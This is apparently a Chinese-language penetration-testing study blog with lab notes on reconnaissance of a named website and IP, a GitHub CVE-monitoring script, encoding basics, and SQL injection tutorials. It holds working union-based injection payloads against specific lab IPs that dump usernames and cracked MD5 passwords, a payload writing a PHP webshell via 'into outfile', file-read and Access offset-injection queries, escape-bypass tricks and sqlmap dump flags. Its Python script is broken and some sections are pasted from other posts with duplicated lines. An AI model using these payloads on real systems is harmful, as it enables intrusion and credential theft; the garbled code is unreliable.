+<figure data-type="image" tabindex="3"><img src="https://jinqipiaopiao.github.io//post-images/1632612888336.png" alt="" loading="lazy"></figure>
+<p>APP提取一键反编译提取</p>
+<p>APP抓取数据包进行工具配合</p>
+<p>各种第三方应用相关探针技术</p>
+<p>各种服务接口信息相关探针技术</p>
+<p>设计案例<br>
+<strong>1.app提取及抓包及后续配合</strong><br>
+某apk一键提取反编译（https://blog.csdn.net/afanbaby/article/details/76756109）<br>
+利用burp历史抓更多url</p>
+<p>每个数据包截断查看<br>
+反编译查出来（少，不全）的url和burp查看的历史结合，找出更多的url</p>
+<p><strong>2.某ip无web框架下的第三方测试</strong><br>
+各种端口一顿乱扫-思路<br>
+各种接口一顿乱扫-思路<br>
+接口部分一顿乱扫-思路</p>
+<p>45.33.42.112<br>
+1.端口扫描：nmap，结果最好，但是满，网速慢，运行速度慢<br>
+2.黑暗引擎搜索强大的引擎，开放的端口，端口可能对应的服务都能检测出来，shodan，钟馗之眼，fofa<br>
+628端口admin，intel远程管理技术，（如果能在管理用户上添加一个新账号，在远程访问获取服务器权限）</p>
+<p><strong>3.群友web授权测试下的服务测试</strong></p>
+<p>目标：凯儿得乐网站<br>
+工具：shodan，fofa<br>
+站长工具，端口扫描工具nmap<br>
+操作时：搜索引擎看信息，<br>
+nmap看端口信息，<br>
+资产信息，旁注，类似域名，子域名等进行搜索和查端口</p>
+<p>1.从黑暗引擎搜索开始：<br>
+搜索caredaily.com这样找的多<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1632614397961.png" alt="" loading="lazy"><br>
+根据搜索结果的信息：子域名，ip端口（ipenssh ,odb数据库，ftp协议）</p>
+<p>2.使用nmap：openssh6版本，iis-http6.0<br>
+在搜索引擎上可以找到很多信息，比如后台等等<br>
+更具开放的端口对应的协议版本，可能有着一些曾经未完善的漏洞如openssh6.6，7版本下就有着远程代码执行的漏洞，搜索引擎并不全面，会偶一楼，再结合端口扫描，有什么用什么</p>
+<p>查找子域名<br>
+1.手动百度搜索：site:caredaily.com（site：把搜索范围限定在特定站点中）<br>
+2.子域名查找工具：在线自己找<br>
+子域名对应着的新的ip，可以对子域名和ip在进行引擎搜索和端口扫描</p>
+<p>旁注<br>
+旁注查询，找在线工具，查到域名或ip还是进行以上两种操作</p>
+<p>类似域名：<br>
+1.子域名查询：查找后缀不一样的域名<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1632614526812.png" alt="" loading="lazy"><br>
+2.备案查询：找到的另外的域名（一般得花钱，还是换一个吧）<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1632614582686.png" alt="" loading="lazy"><br>
+以上备案的其他网址找到了含有一堆网站的页面，含有丰富的信息</p>
+<p>对于其他业务域名，可以在主页面上点一点找一找<br>
+对于不良网站可能经常更换域名等，可以再对网站的以下标题进行搜索（百度谷歌交替用一用）蒂迪师傅演示找到了之前浏览器缓存的原始版本的网站，或者也可以搜索域名关键字caredaily等</p>
+<p>信息收集是个繁琐和必要的工作，信息做好记录（他根据网站后追查到网站源码类型，去尝试登陆后台）。一步步爬吧</p>
+<h1 id="2021-09-26-2">2021-09-26</h1>
+<h1 id="信息收集-资产监控拓展">信息收集-资产监控拓展</h1>
+<p>Github监控<br>
+便于收集整理最新exp或poc<br>
+便于发现相关测试目标的资产<br>
+如何使用（为什么使用这个技术？意识官方的ctms是需要收费的，我们可以通过监控GitHub来找到类似的源码，二是在GitHub官网上有着最细腻的检测漏洞报告）<br>
+首先将下面的内部接口放在pycharm中，安装所对应的脚本所需的库，即import后面的东西<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1632622937384.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1632622940629.png" alt="" loading="lazy"><br>
+接着在GitHub注册，在https://scr.ftqq.com/威胁你登录后获取SendKey，在脚本中进行更改<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1632622944031.png" alt="" loading="lazy"></p>
+<p>绑定微信，运行脚本，就可以获取到监控的内容，以下是监控内容的填写位置<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1632622947669.png" alt="" loading="lazy"></p>
+<p>网站只能绑定企业微信，甭能作到手机上也收到推送，后续会处理这个问题</p>
+<p>各种子域名查询<br>
+DNS，备案，证书<br>
+全球结点请求cdn<br>
+枚举爆破或解析子域名对应<br>
+便于发现管理员相关的注册信息</p>
+<p>黑暗引擎相关搜索fofa，shodan，zoomeye<br>
+微信公众号接口获取<br>
+内部群内部应用内部接口</p>
+<pre><code># Title: wechat push CVE-2020
+# Date: 2020-5-9
+# Exploit Author: weixiao9188
+# Version: 4.0
+# Tested on: Linux,windows
+# cd /root/sh/git/ &amp;&amp; nohup python3 /root/sh/git/git.py &amp;
+# coding:UTF-8
+
+import requests
+import json
+import time
+import os
+import pandas as pd
+time_sleep = 60 #每隔 20 秒爬取一次
+while(True):
+headers1 = {
+	&quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko)
+Chrome/70.0.3538.25 Safari/537.36 Core/1.70.3741.400 QQBrowser/10.5.3863.400&quot;}
+#判断文件是否存在
+datas = []
+response1=None
+response2=None
+if os.path.exists(&quot;olddata.csv&quot;):
+#如果文件存在则每次爬取 10 个
+	df = pd.read_csv(&quot;olddata.csv&quot;, header=None)
+	datas = df.where(df.notnull(),None).values.tolist()#将提取出来的数据中的 nan 转化为 None
+	requests.packages.urllib3.disable_warnings()
+	response1 = requests.get(url=&quot;https://api.github.com/search/repositories?q=CVE-
+2020&amp;sort=updated&amp;per_page=10&quot;,headers=headers1,verify=False)
+	response2 =
+requests.get(url=&quot;https://api.github.com/search/repositories?q=RCE&amp;ssort=updated&amp;per_page=10&quot;,hea
+ders=headers1,verify=False)
+else:
+#不存在爬取全部
+	datas = []
+	requests.packages.urllib3.disable_warnings()
+	response1 = requests.get(url=&quot;https://api.github.com/search/repositories?q=CVE-2020&amp;sort=updated&amp;order=desc&quot;,headers=headers1,verify=False)
+	response2 =
+requests.get(url=&quot;https://api.github.com/search/repositories?q=ctcms&amp;ssort=updated&amp;order=desc&quot;,headers=headers1,verify=False)
+                    
+data1 = json.loads(response1.text)
+data2 = json.loads(response2.text)
+for j in [data1[&quot;items&quot;],data2[&quot;items&quot;]]:
+	for i in j:
+	s = {&quot;name&quot;:i['name'],&quot;html&quot;:i['html_url'],&quot;description&quot;:i['description']}
+	s1 =[i['name'],i['html_url'],i['description']]
+if s1 not in datas:
+#print(s1)
+#print(datas)
+params={
+&quot;text&quot;:s[&quot;name&quot;],
+&quot;desp&quot;:&quot;链接:&quot;+str(s[&quot;html&quot;])+&quot;\n简介&quot;+str(s[&quot;description&quot;])
+}
+print(&quot;当前推送为&quot;+str(s)+&quot;\n&quot;)
+#print(params)
+request.packages.urllib3.disable_warnings()
+request.get(&quot;https://sct.ftqq.com/SendKey填写处.send&quot;, params=params,headers=headers1,timeout=10,verify=False)
+time.sleep(1)#以防推送太快
+print(&quot;推送成功！\n&quot;)
+datas.append(s1)
+else:
+pass
+print(&quot;数据已经存在！&quot;)
+pd.DataFrame(datas).to_csv(&quot;olddata.csv&quot;,header=Nonne,Index=None)   
+time.sleep(time_sleep)
+</code></pre>
+<p>黑暗引擎实现域名端口等收集<br>
+https://fofa.so/</p>
+<figure data-type="image" tabindex="4"><img src="https://jinqipiaopiao.github.io//post-images/1632622960599.png" alt="" loading="lazy"></figure>
+<p>全自动域名手机美剧优秀脚本使用（teemo）<br>
+以xxxx为例，从标题，域名等收集</p>
+<p>以xxxx为例，全自动脚本使用收集<br>
+配置过程<br>
+首先，我们需要在github下载后，解压文件后将文件放进python里面，然后在teemo这个文件下新建cmd.bat(里面的内容是cmd.exe)<br>
+接着我们找到python2（过期了？导致后续配置还未完成，以下截图来源小迪视频）中的script文件夹，将其中的pip.exe拉入命令行中，输入以下命令<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1632622964707.png" alt="" loading="lazy"></p>
+<p>接着将python拖入命令行界面，输入以下命令，开启teemo<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1632622974248.png" alt="" loading="lazy"></p>
+<p>输入以下命令（-d ＋ 域名），进行子域名查询<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1632622977868.png" alt="" loading="lazy"></p>
+<p>查询的结果放在以下文件夹中，以其名称命名<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1632622981754.png" alt="" loading="lazy"></p>
+<p>或者似乎用layer子域名挖掘机直接进行扫描</p>
+<p>SRC目标中的信息收集全覆盖<br>
+补天上专属src建议测试<br>
+利用其他第三方接口获取更多信息</p>
+<p>涉及资源<br>
+https://crt.sh/ （查网站证书的）<br>
+https://sct.ftqq.com/</p>
+<p>https://dnsdb.io/zh-cn/ （详细的DNS解析记录）</p>
+<p>https://sct.ftqq.com/3.version</p>
+<p>https://tools.ipip.net/cdn.php （国外访问国内地址获取网站真实IP地址，之前cdn的知识）</p>
+<p>https://github.com/bit4woo/teemo</p>
+<p>https://securitytrails.com/domain/www.baidu.com/history/a （详细的DNS解析记录）</p>
+<p>https://www.opengps.cn/Data/IP/LocHighAcc.aspx （IP地址定位）</p>
+<p>前cdn的知识）</p>
+<p>https://github.com/bit4woo/teemo</p>
+<p>https://securitytrails.com/domain/www.baidu.com/history/a （详细的DNS解析记录）</p>
+<p>https://www.opengps.cn/Data/IP/LocHighAcc.aspx （IP地址定位）<br>
+————————————————<br>
+版权声明：本文为CSDN博主「是阿明呐」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>
+原文链接：https://blog.csdn.net/weixin_45889197/article/details/119299883</p>
+<h1 id="2021-9-28">2021-9-28</h1>
+<h1 id="基础入门-加密编码算法">基础入门-加密编码算法</h1>
+<p>常见加密编码等算法解析：<br>
+MD5，SHA，ASC，进制时间戳，URL，BASE64，Unescape，AES，DES等</p>
+<p>MD5：十六位和三十二位，加密密文字符串都是由A-Z，0-9随机分配，百分之八十的网站管理员或用户密码采取MD5加密。（不可逆）<br>
+SHA：由A-Z，0-9随机组合，SHA1,SHA256,SHA384,SHA512,长度固定（不可逆）<br>
+进制：碰上的机会不是很大<br>
+时间戳：网站或者服务器脚本语言里经常会使用，会在数据库用户登录和注销，注册里会使用<br>
+URL：浏览器只做一次加密，在渗透绕过的时候可能会使用二次，或者三次加密方式<br>
+BASE64：由A-Z,0-9，A-Z区分大小写，长度固定，长度随密文长度一次增加，经常在字符串后按出现一个&quot;=&quot;或者&quot;==&quot;.常见的代码里，密码，参数值，在WEB应用中<br>
+Unescape：%u+4位数字，对应两位字符，主要应用web应用中<br>
+AES：是一种安全的加密方式，涉及到密码，偏移量，数据块，填充，在加密时候涉及到4种随机性，解密的难度打。用base64揭秘出来的是乱码，有很大可能是aes加密，有时候出现在字符串里面，比较著汇总安全和大型网站，安全比赛<br>
+DES：类似于base64，有时候+会出现字符串里</p>
+<p>常见加密形式算法解析<br>
+直接加密，带salt，带密码，带偏移，带位数，带模式，带干扰，自定义组合等</p>
+<p>常见加密方式（针对）<br>
+枚举，自定义你想算法，可逆向</p>
+<p>了解常规加密算法的特性<br>
+长度位数，字符规律，代码分析，搜索获取</p>
+<p>演示：<br>
+某CTF比赛题目解析<br>
+脚本自定义算法组合逆向<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1632822312092.png" alt="" loading="lazy"></p>
+<p>某CMS密码加密解密<br>
+MD5+salt<br>
+部分CMS密码加密形式-wp,dz等<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1632822359090.png" alt="" loading="lazy"></p>
+<p>单纯用MD5节目是无法解密成功<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1632822612569.png" alt="" loading="lazy"></p>
+<p>用MD5+salt<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1632822616362.png" alt="" loading="lazy"></p>
+<p>解密成功。<code>md5(md5($pass)$salt)</code><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1632822620419.png" alt="" loading="lazy"><br>
+某URL加密地址的漏洞测试<br>
+AES+Base64+自定义<br>
+观察参数值加密字符串，下载源代码分析，函数定义AES加密，设计模式CBC，128位，加密密码，偏移量，两次base64减去常规一次，填充模式。(因为在网站的AES解码中，有输出为base64，故只需解码base64一次)<br>
+mozhe</p>
+<p><img src="https://jinqipiaopiao.github.io//post-images/1632822625073.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1632822628185.png" alt="" loading="lazy"></p>
+<p>下载list.zip<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1632822631723.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1632822634937.png" alt="" loading="lazy"></p>
+<p>先进行base64解密<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1632822643659.png" alt="" loading="lazy"></p>
+<p>再进行AES解密<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1632822647361.png" alt="" loading="lazy"></p>
+<h1 id="2021-09-29">2021-09-29</h1>
+<h1 id="web漏洞-sql注入之简要sql注入">WEB漏洞-sql注入之简要sql注入</h1>
+<figure data-type="image" tabindex="5"><img src="https://jinqipiaopiao.github.io//post-images/1632874825579.png" alt="" loading="lazy"></figure>
+<p><strong>SQL注入安全测试中危害</strong><br>
+分为两类：危害数据库里的数据，直接危害到网站的权限（需满足条件）</p>
+<p><strong>SQL注入产生原理详细分析</strong><br>
+1.SQL语句在定义的时候没有变量，就不能进行SQL注入<br>
+2.可控变量，可以通过其前端（例如post，get，request）进行更改变量，带入数据库查询<br>
+3.变量不存在过滤或过滤不严谨</p>
+<p><strong>可能存在注入的编号选项有哪几个？</strong><br>
+www.xiaodi8.com/index.php?id=8<br>
+www.xiaodi8.com/?id=10<br>
+www.xiaodi8.com/?id=10&amp;x=1<br>
+www.xiaodi8.com/index.php(post注入，看不见变量)</p>
+<p><strong>参数有x注入，哪一个注入测试正确？bc</strong><br>
+a.www.xiaodi8.com/new/php?y=1 and 1=1 &amp;x=2<br>
+b.www.xiaodi8.com/new/php?y=1&amp;x=2 and 1=1<br>
+c.www.xiaodi8.com/new/php?y=1 and 1=1&amp;x=2 and 1=1<br>
+d.www.xiaodi8.com/new/php?xx=1 and 1=1&amp;xxx=2 and 1=1</p>
+<p><strong>and 和or为逻辑判断</strong><br>
+如果参数id存在注入点<br>
+http://www/cnhgs.net/main.php?id53(注入点)&amp;page=1<br>
+-&gt; http://www/cnhgs.net/main.php?page=1&amp;id53(注入点)</p>
+<p>搭建第一个SQL诸如学习靶场环境<br>
+Sqlilabs注入靶场</p>
+<p>学习第一个数据库MYSQL简单注入<br>
+MYSQL数据库<br>
+数据库A=网站A=数据库用户A<br>
+表名<br>
+列名<br>
+数据<br>
+数据库B=网站B=数据库用户B<br>
+。。。。。。<br>
+数据库C=网站C=数据库用户C<br>
+。。。。。。</p>
+<p><strong>必要知识点</strong></p>
+<p>1.在mysql5.0以上版本中，mysql存在一个自带数据库名为information_schema,他是一个存储记录所有数据库名，表名，列名，的数据库，也相当于可以通过查询它指定数据库下面的表名或者列名信息<br>
+2.在数据库中符号&quot;&quot;代表下一级，如xiaodi.user表示xiaodi数据库下的user表名</p>
+<p>information_schema.tables 记录所有表名信息的表<br>
+information_schema.columns 记录所有列名信息的表<br>
+table_name 表名<br>
+column_name 列名<br>
+table_schema 数据库名</p>
+<p>如何判断注入点？<br>
+老办法：<br>
+and 1=1 页面正常<br>
+and 1=2 页面错误<br>
+可能存在注入点</p>
+<p>好办法：<br>
+SELECT * FROM users WHERE id=1 and 1=1 LIMIT 0,1 正常<br>
+SELECT * FROM users WHERE id=1 and 1=2 LIMIT 0,1 错误</p>
+<p>逻辑运算符<br>
+或 且 非<br>
+or and xor<br>
+真 且 真 = 真<br>
+真 且 假 = 假<br>
+真 或 假 = 真</p>
+<p>SELECT * FROM users WHERE id=1 真<br>
+1=1 真<br>
+1=2 假</p>
+<p>真且真=真<br>
+真且假=假</p>
+<p>SELECT * FROM users WHERE id=1 or 1=1 LIMIT 0,1 正常<br>
+SELECT * FROM users WHERE id=1 or 1=2 LIMIT 0,1 正常<br>
+不能用or判断<br>
+为什么不能？<br>
+是因为id=1为真的话，那么两个语句都为真是无法判断的，那如果id=1为假的话，可以用or进行判断</p>
+<figure data-type="image" tabindex="6"><img src="https://jinqipiaopiao.github.io//post-images/1632876691869.png" alt="" loading="lazy"></figure>
+<p><strong>要选用最舒服的方法测试</strong><br>
+select * from users where id = 1asdsadsad（随便输入）limit 0,1<br>
+随便输入后对网页有影响说明带入数据库进行查询有注入点，没有影响说明没有带入数据库查询，出现404错误说明对数据检测没有漏洞</p>
+<p><strong>猜解列名数量（字段数）</strong><br>
+order by x（数字）正常与错误的正常值<br>
+正确的话网页正常显示，错误的话网页报错</p>
+<p>http://219.153.49.228:43230/new_list.php?id=1 order by 4<br>
+=select * from users where id =1 order by 4</p>
+<p>网页正确说明有select搜索的是属性列个数为4</p>
+<p><strong>报错猜解准备</strong><br>
+http://219.153.49.228:43230/new_list.php?id=1 union select 1,2,3,4<br>
+http://219.153.49.228:43230/new_list.php?id=-1%20union%20%20select%201,2,3,4<br>
+或<br>
+http://219.153.49.228:43230/new_list.php?id=1%20and%201=22222%20union%20%20select%201,2,3,4</p>
+<p><strong>信息收集</strong><br>
+数据库版本：version()           5.7.22-0ubuntu0.16.04.1<br>
+数据库名字：database()          mozhe_Discuz_StormGroup<br>
+数据库用户：user()                  root@localhost<br>
+操作系统：@@version_compile_os      Linux</p>
+<p>根据猜想的列数得到4所以union右边必须有的四个属性列<br>
+http://219.153.49.228:43230/new_list.php?id=-1 union select 1,database(),version(),4<br>
+http://219.153.49.228:43230/new_list.php?id=-1 union select 1,user(),@@version_compile_os,4</p>
+<p><strong>查询指定数据库名</strong></p>
+<p>mozhe_Discuz_StormGroup下的表名信息：<br>
+http://219.153.49.228:43230/new_list.php?id=-1 union select 1,table_name,3,4 from information_schema.tables where table_schema='mozhe_Discuz_StormGroup'</p>
+<p><strong>查询所有表名</strong></p>
+<p>http://219.153.49.228:43230/new_list.php?id=-1 union select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema='mozhe_Discuz_StormGroup'</p>
+<p><strong>查询指定表名的全部列名</strong></p>
+<p>http://219.153.49.228:43230/new_list.php?id=-1 union select 1,group_concat(column_name),3,4 from information_schema.columns where table_name='StormGroup_member'</p>
+<p><strong>查询指定数据</strong><br>
+http://219.153.49.228:43230/new_list.php?id=-1 union select 1,name,password,4 from StormGroup_member</p>
+<p><strong>猜解多个数据</strong><br>
+可以采用limit x,1 变动猜解<br>
+http://219.153.49.228:43230/new_list.php?id=-1 union select 1,name,password,4 from StormGroup_member limit 0,1<br>
+mozhe<br>
+356f589a7df439f6f744ff19bb8092c0 MD5解密 dsan13</p>
+<p>http://219.153.49.228:43230/new_list.php?id=-1 union select 1,name,password,4 from StormGroup_member limit 1,1<br>
+mozhe<br>
+a26f03bdd67bc4a815c2c30c6daf0ce3 MD5解密 959003</p>
+<figure data-type="image" tabindex="7"><img src="https://jinqipiaopiao.github.io//post-images/1632876685293.png" alt="" loading="lazy"></figure>
+<p>案例<br>
+简易代码分析SQL注入原理<br>
+接收数据 -&gt; 拼接数据 -&gt; 数据进数据库执行 -&gt; 展示结果</p>
+<figure data-type="image" tabindex="8"><img src="https://jinqipiaopiao.github.io//post-images/1632876838728.png" alt="" loading="lazy"></figure>
+<p>通过参数传递到拼接好的SQL语句中，由于是拼接语句就可以将一些恶意的SQL语句拼接到上面，来实现恶意的SQL语句执行的效果</p>
+<figure data-type="image" tabindex="9"><img src="https://jinqipiaopiao.github.io//post-images/1632876842225.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="10"><img src="https://jinqipiaopiao.github.io//post-images/1632876846630.png" alt="" loading="lazy"></figure>
+<p>————————————————<br>
+版权声明：本文为CSDN博主「硫酸超」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>
+原文链接：https://blog.csdn.net/weixin_45441315/article/details/119106593</p>
+<h1 id="sql注入之mysql注入">SQL注入之MYSQL注入</h1>
+<p>MYSQL注入中首先要明确当前注入点权限，高权限注入时有更多的攻击手法，有的等直接进行getshell操作，其中也会遇到哼多的阻碍，相关方与手法也要明确，所谓知己知彼，百战不殆，作为俺去那开发工作者，攻防兼备。注入点权限是否为root，取决于连接数据库的文件，这也决定了高权限注入以及低权限注入</p>
+<figure data-type="image" tabindex="11"><img src="https://jinqipiaopiao.github.io//post-images/1633431704175.png" alt="" loading="lazy"></figure>
+<p>跨库查询及应用思路<br>
+information_schema 表特性，记录库名，表名，列名对应表</p>
+<p>获取所有数据库名<br>
+?id=-1 union select 1,group_concat(schema_name),3 from information_schema.schemata</p>
+<p>查表，找与网站对应的数据库名，若没有，则挨个查。或者使用union select 1,2,database()<br>
+?id=-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='qqyw'</p>
+<p>跨库查列<br>
+?id=-1 union select 1,group_concat(column_name),3 from information_schema.columns where table_name='admin' and table_schema='qqyw'</p>
+<p>查结果<br>
+?id=-1 union select 1,u,p from qqyw.admin</p>
+<p><strong>文件读写操作</strong><br>
+load_file():读取文件函数<br>
+into outfile或者into dumpfile:导出函数<br>
+路径获取常见方法：<br>
+报错显示：(phpinfo.php) 遗留文件，漏洞报错，平台配置文件</p>
+<p>常见读取文件列表：（需得知网站绝对路劲）<br>
+union select 1,load_file('D://phpmyadmin//dudu.txt'),3</p>
+<p>常见写入文件问题:魔术引号开关<br>
+union select 1,<code>'&lt;?php $eval($_POST['dudu']);?&gt;'</code>,3 into outfile 'D:\WWW\DUDU.php'</p>
+<p>魔术引号及常见保护<br>
+php.ini中存在magic_quotes_gpc选项，称为魔术引号，此选项打开，使用get，post，cookie所接受的'单引号，“双引号，\反斜线，和NULL字符全都被加上一个反斜线转义，此时，注入类型是字符型注入已经无法构成威胁</p>
+<p>isset无法绕过 替换关键字</p>
+<p>在数据库使用了宽字符集而web中没考虑这个问题的情况下，在web层，由于0XBF27是两个字符，在PHP中比如addslash和magic_quotes_gpc开启时，由于会对0X27单引号进行转义，因此0xbf5c27，而数据进入数据库中时，由于0XBF5C是另外一个字符，因此转移符号会被前面的bf&quot;吃掉&quot;，单引号由此逃逸出来可以用来闭合语句</p>
+<p>自定义关键字替换</p>
+<p>WAF对常见攻击语句进行爆错绕过思路</p>
+<p>低版本注入配合读取或者暴力<br>
+5.0版本以下，跑字典<br>
+字典或读取</p>
+<h1 id="十四sql注入之类型及提交注入">十四：SQL注入之类型及提交注入</h1>
+<p>简要明确参数类型<br>
+数字，字符，搜索，json等<br>
+简要明确请求方法<br>
+GET,POST,COOKIE,REQUEST,HTTP头<br>
+其中SQL语句干扰符号：' &quot; % ) } 等，具体查看用法</p>
+<p>非字符串需要单，双引号括起 需要闭合，才能形成and 1=1 逻辑判断</p>
+<p>前提是寻求请求方法，然后来进行测试。</p>
+<p>需了解json类型的注入</p>
+<h1 id="2021-10-06">2021-10-06</h1>
+<h1 id="sql注入之oraclemongodb等注入">SQL注入之Oracle，MongoDB等注入</h1>
+<p><img src="https://jinqipiaopiao.github.io//post-images/1633485604417.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1633485624129.png" alt="" loading="lazy"></p>
+<p><strong>简要学习各种数据库的注入特点</strong><br>
+数据库架构组成，数据库高权限操作</p>
+<p>ACCESS,MYSQL,MSSQL,MONGODB,POSTGRESQL,SQLITE,ORACLE,SYBASE等<br>
+除了Access其他数据库组成架构基本都是大同小异<br>
+Access 表名，列名，数据</p>
+<p>access数据库保存在网站源码下面，自己网站数据库独立存在，没有文件读写的操作<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1633485800302.png" alt="" loading="lazy"></p>
+<p>mysql mssql等<br>
+数据库名A<br>
+表名<br>
+列名<br>
+数据<br>
+数据库名B<br>
+。。。。。。</p>
+<p>每个数据库功能不同，我们采取注入的时候攻入方式不同</p>
+<p><strong>什么决定注入点用户权限？</strong><br>
+<strong>数据库配置文件</strong></p>
+<p><strong>Access</strong><br>
+用sqlmap判断数据库类型<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1633485885586.png" alt="" loading="lazy"></p>
+<p>Access只是单纯的数据库，只有数据，没有数据库名，数据库版本，操作系统等功能，没有information_shcema。可直接查询数据，获取表名，列名。<br>
+用猜解方式猜解表名，列名</p>
+<pre><code>219.153.49.228:43932/new_list.asp?id=-1 union select 1,2,3,4 from admin
+219.153.49.228:43932/new_list.asp?id=-1 union select username,passwd,3,4 from admin
+</code></pre>
+<figure data-type="image" tabindex="12"><img src="https://jinqipiaopiao.github.io//post-images/1633485973780.png" alt="" loading="lazy"></figure>
+<p><strong>access注入时，如果列名或者表名才接不到的情况怎么办?</strong><br>
+<strong>Access偏移注入</strong></p>
+<p>偏移注入主要是针对知道表，但是不知道字段的ACCESS数据库。</p>
+<p>比如我们已经知道了表名是 admin</p>
+<p>1.判断字段数：</p>
+<pre><code>http://192.168.74.136:8002/Production/PRODUCT_DETAIL.asp?id=1406 order by 22            返回正常
+http://192.168.74.136:8002/Production/PRODUCT_DETAIL.asp?id=1406 order by 23           返回错误
+</code></pre>
+<p>2.字段数为 22</p>
+<p>爆出显示位：</p>
+<pre><code>http://192.168.74.136:8002/Production/PRODUCT_DETAIL.asp?id=1406 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22 from admin
+</code></pre>
+<figure data-type="image" tabindex="13"><img src="https://jinqipiaopiao.github.io//post-images/1633486232145.png" alt="" loading="lazy"></figure>
+<p>3.判断表内存在的字段数</p>
+<pre><code>http://192.168.74.136:8002/Production/PRODUCT_DETAIL.asp?id=1406 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,* from admin       返回同上图一样得显示位页面
+http://192.168.74.136:8002/Production/PRODUCT_DETAIL.asp?id=1406 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,* from admin   返回错误
+</code></pre>
+<p>说明了admin表下有6个字段；</p>
+<p>用&quot;<em>&quot;代表 admin 表的字段数，计算</em>代替字符的位数。</p>
+<p>Access偏移注入原理，基本公式为：</p>
+<p>order by 出的字段数减去*号的字段数，然而再用order by的字段数减去2倍刚才得出来的答案；</p>
+<p>也就是：</p>
+<pre><code>`* = 6个字符`
+
+2 × * = 12个字符
+
+22 - 12 = 10个字符
+</code></pre>
+<p>5.注入公式如下：(爆破内容是随机的)<br>
+一级偏移注入公式：</p>
+<pre><code>http://192.168.74.136:8002/Production/PRODUCT_DETAIL.asp?id=1406 union select 1,2,3,4,5,6,7,8,9,10,* from (admin as a inner join admin as b on a.id = b.id)
+</code></pre>
+<p>此时可以增加a.id或者b.id或者a.id和b.id一起加上去来改变随机爆破出来的内容比如：</p>
+<pre><code>http://192.168.74.136:8002/Production/PRODUCT_DETAIL.asp?id=1406 union select 1,2,3,4,5,6,7,8,9,10,a.id,b.id,* from (admin as a inner join admin as b on a.id = b.id)
+</code></pre>
+<p>二级偏移注入公式：</p>
+<pre><code>http://192.168.74.136:8002/Production/PRODUCT_DETAIL.asp?id=1406 union select 1,2,3,4,* from ((admin as a inner join admin as b on a.id = b.id)inner join admin as c on a.id=c.id)
+</code></pre>
+<p>此时可以增加a.id或者b.id或者a.id和b.id一起加上去来改变随机爆破出来的内容比如：</p>
+<pre><code>http://192.168.74.136:8002/Production/PRODUCT_DETAIL.asp?id=1406 union select 1,2,3,4,a.id,b.id,c.id,* from ((admin as a inner join admin as b on a.id = b.id)inner join admin as c on a.id=c.id)
+</code></pre>
+<p>注意：这里是10个字段再减去了表里的6个字段，所以二级偏移这里是select 1,2,3,4</p>
+<p>注意：查看源代码有奇效，可能会出现惊喜<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1633486438563.png" alt="" loading="lazy"></p>
+<p>简要学习各种注入工具的使用指南<br>
+熟悉工具的支持库，注入模式，优缺点等</p>
+<p>Sqlmap，NoSQLAttack，Pangolin等</p>
+<p>安装Sqlmap<br>
+image-20210812224625210<br>
+来源网站：https://www.cnblogs.com/bmjoker/p/9326258.html<br>
+安装Sqlmap</p>
+<p>基本操作笔记：-u  #注入点<br>
+-f  #指纹判别数据库类型<br>
+-b  #获取数据库版本信息<br>
+-p  #指定可测试的参数(?page=1&amp;id=2 -p &quot;page,id&quot;)<br>
+-D &quot;&quot;  #指定数据库名<br>
+-T &quot;&quot;  #指定表名<br>
+-C &quot;&quot;  #指定字段<br>
+-s &quot;&quot;  #保存注入过程到一个文件,还可中断，下次恢复在注入(保存：-s &quot;xx.log&quot;　　恢复:-s &quot;xx.log&quot; --resume)<br>
+--level=(1-5) #要执行的测试水平等级，默认为1<br>
+--risk=(0-3)  #测试执行的风险等级，默认为1<br>
+--time-sec=(2,5) #延迟响应，默认为5<br>
+--data #通过POST发送数据<br>
+--columns        #列出字段<br>
+--current-user   #获取当前用户名称<br>
+--current-db     #获取当前数据库名称<br>
+--users          #列数据库所有用户<br>
+--passwords      #数据库用户所有密码<br>
+--privileges     #查看用户权限(--privileges -U root)<br>
+-U               #指定数据库用户<br>
+--dbs            #列出所有数据库<br>
+--tables -D &quot;&quot;   #列出指定数据库中的表<br>
+--columns -T &quot;user&quot; -D &quot;mysql&quot;      #列出mysql数据库中的user表的所有字段<br>
+--dump-all            #列出所有数据库所有表<br>
+--exclude-sysdbs      #只列出用户自己新建的数据库和表<br>
+--dump -T &quot;&quot; -D &quot;&quot; -C &quot;&quot;   #列出指定数据库的表的字段的数据(--dump -T users -D master -C surname)<br>
+--dump -T &quot;&quot; -D &quot;&quot; --start 2 --top 4  # 列出指定数据库的表的2-4字段的数据<br>
